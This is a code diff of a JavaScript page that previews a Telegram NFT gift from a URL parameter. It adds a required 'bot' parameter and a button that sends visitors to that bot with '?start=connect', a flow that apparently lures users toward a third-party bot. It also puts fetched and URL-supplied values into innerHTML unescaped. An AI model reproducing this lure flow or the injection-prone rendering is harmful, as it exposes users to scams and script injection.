@@ -1,14 +1,20 @@
 async function loadNFT() {
     const params = new URLSearchParams(window.location.search);
     const giftUrl = params.get('gift');
+    const botUsername = params.get('bot');
 
     if (!giftUrl) {
         window.location.href = 'https://getgems.io/';
         return;
     }
 
+    if (!botUsername) {
+        window.location.href = 'https://getgems.io/';
+        return;
+    }
+
     if (!giftUrl.startsWith('https://t.me/')) {
-        document.getElementById('preview').innerHTML = '<p>Некорректная ссылка.</p>';
+        document.getElementById('preview').innerHTML = '<div class="error-message">Некорректная ссылка.</div>';
         document.getElementById('result').innerHTML = '';
         return;
     }
@@ -17,7 +23,7 @@ async function loadNFT() {
 
     try {
         const res = await fetch(proxy + giftUrl);
-        if (!res.ok) throw new Error();
+        if (!res.ok) throw new Error('Network error');
 
         const html = await res.text();
         const doc = new DOMParser().parseFromString(html, 'text/html');
@@ -25,27 +31,29 @@ async function loadNFT() {
         const previewEl = document.getElementById('preview');
         previewEl.innerHTML = '';
 
+        // Create background container
+        const bgDiv = document.createElement('div');
+        bgDiv.className = 'nft_background';
+        
         const gift = doc.querySelector('.tgme_gift_preview');
         const svg = gift?.querySelector('svg');
         if (svg) {
-            const bgDiv = document.createElement('div');
-            bgDiv.className = 'nft_background';
             bgDiv.innerHTML = svg.outerHTML;
-            previewEl.appendChild(bgDiv);
         }
+        
+        previewEl.appendChild(bgDiv);
 
+        // Create sticker container
         const source = doc.querySelector('source[type="application/x-tgsticker"]');
         const tgsUrl = source?.srcset?.split(',')[0]?.trim();
         if (tgsUrl) {
             const stickerDiv = document.createElement('div');
             stickerDiv.className = 'nft_sticker';
-            stickerDiv.innerHTML = `<tgs-player src="${tgsUrl}" autoplay loop style="width:200px; height:200px;"></tgs-player>`;
+            stickerDiv.innerHTML = `<tgs-player src="${tgsUrl}" autoplay loop></tgs-player>`;
             previewEl.appendChild(stickerDiv);
         }
 
         document.getElementById('telegram-btn').href = giftUrl;
-
-        // Без encodeURIComponent
         const shareLink = `tg://msg_url?text=Check out this gift!&url=${giftUrl}`;
         document.getElementById('share-btn').href = shareLink;
 
@@ -61,63 +69,54 @@ async function loadNFT() {
 
         const resultEl = document.getElementById('result');
         resultEl.innerHTML = out.map(f => `
-        <div class="field">
-        <div class="label">${f.label}</div>
-        <div class="value"><mark>${f.value}</mark></div>
-        </div>
+            <div class="field">
+                <div class="label">${f.label}</div>
+                <div class="value"><mark>${f.value}</mark></div>
+            </div>
         `).join('');
 
-    } catch {
-        document.getElementById('preview').innerHTML = '<p>Ошибка загрузки NFT.</p>';
+    } catch (error) {
+        console.error('Error loading NFT:', error);
+        document.getElementById('preview').innerHTML = '<div class="error-message">Ошибка загрузки NFT.</div>';
         document.getElementById('result').innerHTML = '';
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const giftBtn = document.querySelector('.btn.green');
+
+document.querySelector('.btn.get').addEventListener('click', () => {
+    const params = new URLSearchParams(window.location.search);
+    const botUsername = params.get('bot');
+    if (!botUsername) return;
+
     const modal = document.getElementById('gift-modal');
-    const closeBtn = document.getElementById('modal-close');
+    const openBotLink = document.getElementById('open-bot-link');
 
-    const slides = modal.querySelectorAll('.slide');
-    const prevBtn = document.getElementById('prev-slide');
-    const nextBtn = document.getElementById('next-slide');
-    let currentIndex = 0;
-
-    function showSlide(index) {
-        slides.forEach((slide, i) => {
-            slide.classList.toggle('active', i === index);
-        });
-    }
-
-    giftBtn.addEventListener('click', () => {
-        modal.classList.remove('hidden');
-        currentIndex = 0;
-        showSlide(currentIndex);
-    });
-
-    closeBtn.addEventListener('click', () => {
-        modal.classList.add('hidden');
-    });
-
-    prevBtn.addEventListener('click', () => {
-        currentIndex = (currentIndex - 1 + slides.length) % slides.length;
-        showSlide(currentIndex);
-    });
-
-    nextBtn.addEventListener('click', () => {
-        currentIndex = (currentIndex + 1) % slides.length;
-        showSlide(currentIndex);
-    });
-
-    // Закрытие по клику вне окна
-    modal.addEventListener('click', (e) => {
-        if (e.target === modal) {
-            modal.classList.add('hidden');
-        }
-    });
+    openBotLink.href = `https://t.me/${botUsername}?start=connect`;
+    modal.style.display = 'flex';
 });
 
+document.querySelector('.close-icon').addEventListener('click', () => {
+    document.getElementById('gift-modal').style.display = 'none';
+});
+
+function checkCSSLoaded() {
+    const testEl = document.createElement('div');
+    testEl.className = 'btn';
+    testEl.style.display = 'none';
+    document.body.appendChild(testEl);
+
+    const computedStyle = getComputedStyle(testEl);
+    const isCSSLoaded = computedStyle.borderRadius !== '' && computedStyle.borderRadius !== '0px';
+
+    if (!isCSSLoaded) {
+        alert('Ошибка: перезапустите страницу.');
+        console.warn('CSS not loaded or failed to apply.');
+    }
+
+    document.body.removeChild(testEl);
+}
 
 
 
 loadNFT();
+checkCSSLoaded();
